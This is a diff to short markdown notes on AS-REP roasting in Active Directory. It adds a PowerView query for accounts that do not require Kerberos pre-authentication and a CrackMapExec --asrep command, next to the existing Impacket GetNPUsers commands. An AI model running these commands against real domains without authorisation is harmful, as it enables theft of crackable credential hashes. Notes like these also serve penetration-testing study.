@@ -2,6 +2,10 @@
 
 ### This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.
 
+## Requirements:
+
+### Accounts with the attribute DONT_REQ_PREAUTH ( PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose )
+
 #### Impacket-GetNPUsers.py domain.com\john.doe -no-pass (Retrieves a TGT)
 
 ### You can also do:
@@ -9,6 +13,10 @@
 #### 1) Gather domain accounts in a list
 
 #### 2) python3 Impacket-GetNPUsers.py -dc-ip DC_IP DOMAIN/USER -outputfile /tmp/list.txt
+
+## Alternate Method: CrackMapExec
+
+ -  crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asrep
 
 ### More tools:
 
